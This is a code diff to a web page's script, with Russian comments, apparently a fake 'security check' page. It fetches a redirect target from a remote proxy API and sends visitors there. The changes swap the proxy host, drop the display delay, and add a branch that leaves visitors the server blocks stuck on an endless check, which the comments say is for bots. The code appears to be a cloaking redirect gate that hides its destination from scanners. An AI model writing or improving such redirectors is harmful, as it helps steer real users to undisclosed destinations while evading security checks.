@@ -80,7 +80,7 @@
     </div>
 
     <script>
-        const MY_PROXY_API = "https://gs517-security-check.hf.space/api.php";
+        const MY_PROXY_API = "https://render-deploy-project-s8jv.onrender.com/api.php";
 
         function appendUtmSource(targetUrl) {
             try {
@@ -140,16 +140,25 @@
         }
 
         document.addEventListener('DOMContentLoaded', function() {
-            const start = Date.now();
-            const minDelay = 1500;
             const maxWait = 15000;
             const errMsg = document.getElementById('errorMsg');
             const debugLog = document.getElementById('debugLog');
 
-                        function fetchWithRetry(url, retries) {
+            function fetchWithRetry(url, retries) {
                 return fetch(url)
-                    .then(response => response.json().then(data => ({ status: response.status, data })))
+                    .then(response => {
+                        if (response.status === 403) {
+                            throw new Error('Access Denied');
+                        }
+                        return response.text().then(text => {
+                            if (!text) throw new Error('Empty response');
+                            return { status: response.status, data: JSON.parse(text) };
+                        });
+                    })
                     .catch(err => {
+                        if (err.message === 'Access Denied' || err.message === 'Empty response') {
+                            throw err; // Не ретраим при блокировке
+                        }
                         if (retries > 0) {
                             if (debugLog) {
                                 debugLog.style.display = 'block';
@@ -170,17 +179,16 @@
             Promise.race([fetchPromise, timeoutPromise])
                 .then(({ status, data }) => {
                     if (data && data.success && data.url) {
-                        const elapsed = Date.now() - start;
-                        const delay = Math.max(0, minDelay - elapsed);
-                        setTimeout(() => {
-                            doRedirect(data.url);
-                        }, delay);
+                        doRedirect(data.url);
                     } else {
                         throw new Error(data.error || 'Unknown Error (Status ' + status + ')');
                     }
                 })
                 .catch(error => {
                     console.error("Fetch Error:", error);
+                    if (error.message === 'Access Denied') {
+                        return; // Бесконечная проверка для ботов
+                    }
                     errMsg.style.display = 'block';
                     errMsg.textContent = "Ошибка: " + error.message;
                     if (debugLog) {
